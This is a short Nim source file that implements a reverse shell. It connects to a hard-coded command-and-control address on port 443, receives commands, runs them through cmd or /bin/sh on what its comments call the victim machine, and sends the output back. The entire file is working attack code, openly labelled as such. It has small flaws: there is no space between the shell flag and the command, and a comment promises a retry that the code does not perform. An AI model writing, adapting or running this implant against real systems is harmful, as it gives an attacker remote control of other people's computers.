import net
import osproc  # for execCmdEx
import os
 
# Your C&C server IP and Port
var ip = "192.168.1.68"
var port = 443
 

# Create a new socket
var socket = newSocket() 
var finalcommand : string

try:
    socket.connect(ip, Port(port)) # Connect to our C&C server
        
        # On a successful connection receive command from C&C server , execute the command and send back result
    while true:
        var command = socket.recvLine() # Reads the command from our server to get executed on the victim machine
        echo(command)
        if command == "bye":
            socket.send("Exiting Nim Shell")
            socket.close()
            system.quit(0)
        if system.hostOS == "windows":
            finalcommand = "cmd /C" & command
        else:
            finalcommand = "/bin/sh -c" & command
        var (cmdres, _) = execCmdEx(finalcommand) #  Executes the command and saves the result in cmdres
        socket.send(cmdres) # Sends back the result to the C&C server
                    
    socket.close()
    system.quit(0)

# if connection fails , try after 5 seconds        
except:
    echo "Connection failed."
        